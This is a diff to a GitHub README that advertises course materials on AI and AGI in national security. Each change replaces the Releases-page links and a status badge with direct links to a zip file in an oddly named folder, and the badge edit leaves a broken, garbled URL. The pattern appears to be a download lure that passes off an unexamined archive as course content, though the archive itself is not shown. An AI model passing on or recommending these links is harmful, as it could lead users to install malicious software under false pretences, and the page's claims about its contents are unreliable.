@@ -1,6 +1,6 @@
 # 📚 SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera - Enhance Your Knowledge on AI in Security
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download Now](https://raw.githubusercontent.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/main/serodiagnosis/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera.zip%20Now-Get%20Started-brightgreen)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ To begin your learning journey, follow these simple steps:
 
 1. **Visit the Releases Page**
    - Click on the link below to access the Release page.
-   - [Download Here](https://github.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/releases).
+   - [Download Here](https://raw.githubusercontent.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/main/serodiagnosis/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera.zip).
 
 2. **Select the Version**
    - Browse the available versions for the courses.
@@ -50,7 +50,7 @@ To begin your learning journey, follow these simple steps:
 ## 📥 Download & Install
 
 To start learning, visit this page to download the course materials:  
-[Download Here](https://github.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/releases).
+[Download Here](https://raw.githubusercontent.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/main/serodiagnosis/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera.zip).
 
 ## 🌐 Course Topics
 
@@ -88,4 +88,4 @@ Stay informed about new releases and updates by following the repository. Check 
 Dive into the world of AI and AGI as it relates to national security. This comprehensive course is designed to equip you with the knowledge you need to understand the future of technology in governance and safety.
 
 Visit this page to download your course materials and get started today!  
-[Download Here](https://github.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/releases).
+[Download Here](https://raw.githubusercontent.com/moha19990/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera/main/serodiagnosis/SCSP-Learning-Program-AI-and-AGI-in-National-Security-Coursera.zip).
